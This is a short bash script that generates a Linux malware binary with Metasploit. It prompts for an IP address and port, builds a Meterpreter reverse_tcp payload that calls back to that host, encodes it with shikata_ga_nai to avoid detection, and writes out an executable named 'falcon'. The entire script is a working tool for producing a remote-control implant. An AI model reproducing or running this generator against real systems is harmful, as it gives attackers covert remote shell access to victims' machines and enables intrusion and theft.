#!/bin/bash

#This is just script from http://astrobaby.wordpress.com
#Modified & Tested by falconflame a.k.a dr. F

clear
echo "*********************************************"
echo "  LINUX ELF BINARY GENERATOR FOR METASPLOIT  "
echo "*********************************************"
echo -e "What IP are we gonna use?: \c"
read IP
echo -e "What port number are we gonna listen to?: \c"
read port

msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R | msfencode -t elf -e x86/shikata_ga_nai >> falcon

echo "falcon binary generated..."
chmod ug=rwx falcon
ls -la falcon
